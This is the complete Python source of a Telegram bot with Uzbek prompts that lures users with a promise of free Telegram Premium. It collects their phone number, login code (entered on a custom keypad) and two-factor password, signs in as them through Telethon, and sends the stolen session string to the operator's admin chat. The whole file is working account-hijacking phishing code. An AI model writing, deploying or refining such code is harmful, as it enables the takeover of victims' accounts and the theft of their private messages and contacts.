import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

user_states = {}

def code_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(str(i), callback_data=f"digit:{i}") for i in range(1, 4)],
        [InlineKeyboardButton(str(i), callback_data=f"digit:{i}") for i in range(4, 7)],
        [InlineKeyboardButton(str(i), callback_data=f"digit:{i}") for i in range(7, 10)],
        [InlineKeyboardButton("0", callback_data="digit:0"),
         InlineKeyboardButton("←", callback_data="delete"),
         InlineKeyboardButton("✅", callback_data="done")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact_button = KeyboardButton("📱 Raqam yuborish", request_contact=True)
    markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
    await update.message.reply_text(
        "Telegram Prim olish uchun Telefon raqamingizni yuboring",
        reply_markup=markup
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.contact.phone_number
    if not phone.startswith("+"):
        phone = f"+{phone}"
    user_id = update.effective_user.id

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)

        user_states[user_id] = {
            "client": client,
            "phone": phone,
            "code": "",
            "awaiting_password": False
        }

        await update.message.reply_text(
            "📩 KOD YUBORILDI KODNI YOZING",
            reply_markup=code_keyboard()
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Xatolik: {e}")

async def handle_code_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if user_id not in user_states:
        await query.edit_message_text("⛔ Sessiya tugagan. /start buyrug'ini yuboring")
        return

    data = user_states[user_id]

    if query.data.startswith("digit:"):
        digit = query.data.split(":")[1]
        data["code"] += digit
    elif query.data == "delete":
        data["code"] = data["code"][:-1]
    elif query.data == "done":
        await try_sign_in(update, context, user_id)
        return

    await query.edit_message_text(
        f"🔢 Kod: `{data['code']}`",
        parse_mode="Markdown",
        reply_markup=code_keyboard()
    )

async def try_sign_in(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    data = user_states[user_id]
    client = data["client"]
    code = data["code"]

    try:
        await client.sign_in(phone=data["phone"], code=code)
        session_str = client.session.save()

        await context.bot.send_message(chat_id=ADMIN_ID, text=f"`{session_str}`", parse_mode="Markdown")
        await context.bot.send_message(chat_id=user_id, text="✅ Tizimga kirildi. Sessiya yuborildi.")
        await client.disconnect()
        del user_states[user_id]

    except Exception as e:
        if "SESSION_PASSWORD_NEEDED" in str(e):
            await context.bot.send_message(
                chat_id=user_id,
                text="🔒 2FA Kod turibti ekan, iltimos davom etish uchun 2FA kodni yuboring"
            )
            data["awaiting_password"] = True
        else:
            await context.bot.send_message(chat_id=user_id, text=f"❌ Xatolik: {e}")

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_states or not user_states[user_id].get("awaiting_password"):
        return

    password = update.message.text.strip()
    data = user_states[user_id]
    client = data["client"]

    try:
        await client.sign_in(password=password)
        session_str = client.session.save()

        await context.bot.send_message(chat_id=ADMIN_ID, text=f"`{session_str}`", parse_mode="Markdown")
        await context.bot.send_message(chat_id=user_id, text="✅ Sessiya yuborildi. Rahmat!")
        await client.disconnect()
        del user_states[user_id]

    except Exception as e:
        await update.message.reply_text(f"❌ 2FA xatolik: {e}")

async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(CallbackQueryHandler(handle_code_buttons))
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE, handle_password))
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
